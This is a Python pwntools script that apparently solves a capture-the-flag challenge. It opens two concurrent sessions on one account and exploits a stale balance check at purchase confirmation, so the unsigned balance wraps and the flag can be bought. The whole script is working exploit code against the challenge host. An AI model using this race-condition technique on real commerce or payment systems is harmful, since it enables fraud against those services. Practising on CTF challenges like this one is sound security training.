#!/usr/bin/env python3
from pwn import *
import re
import time

HOST = "instancer.dalctf2026.com"
PORT = 23270

context.log_level = "error"


def start_session(username: bytes, password: bytes):
    r = remote(HOST, PORT)
    r.recvuntil(b"Username: ")
    r.sendline(username)
    r.recvuntil(b"Password: ")
    r.sendline(password)
    r.recvuntil(b"Option: ")
    return r


def mine_until_ten(r):
    bits = 0
    while bits < 10:
        r.sendline(b"1")
        out = r.recvuntil(b"Option: ")
        if b"Bonus! +2 bits" in out:
            bits += 2
        elif b"+1 bit" in out:
            bits += 1
        else:
            raise RuntimeError(f"unexpected mine output: {out!r}")
    return bits


def buy_item_and_wait_confirm(r, item: bytes):
    r.sendline(b"2")
    r.recvuntil(b"Option: ")
    r.sendline(item)
    r.recvuntil(b"Confirm purchase (y / n): ")


def finish_buy(r):
    r.sendline(b"y")
    return r.recvuntil(b"Option: ")


def main():
    tag = str(int(time.time()))
    username = f"u{tag}".encode()
    password = f"p{tag}".encode()

    r = start_session(username, password)
    bits = mine_until_ten(r)

    # Session A enters the shop with a stale balance snapshot.
    buy_item_and_wait_confirm(r, b"1")

    # Session B spends 10 bits first, making the real balance smaller than
    # the stale balance held by session A.
    r2 = start_session(username, password)
    buy_item_and_wait_confirm(r2, b"1")
    out_b = finish_buy(r2)
    r2.sendline(b"3")
    r2.recvall(timeout=1)
    r2.close()

    # Session A confirms the purchase using the stale check. The subtraction
    # is done on the freshly loaded account, so this wraps the unsigned balance.
    out_a = finish_buy(r)

    # Now the wrapped balance is enough to buy the flag.
    r.sendline(b"2")
    r.recvuntil(b"Option: ")
    r.sendline(b"4")
    r.recvuntil(b"Confirm purchase (y / n): ")
    r.sendline(b"y")
    data = r.recvuntil(b"Option: ")

    m = re.search(rb"Flag: ([^\r\n]+)", data)
    if not m:
        raise RuntimeError(f"flag not found in output: {data!r}")

    flag = m.group(1).decode()
    print(flag)

    r.sendline(b"3")
    r.recvall(timeout=1)
    r.close()


if __name__ == "__main__":
    main()
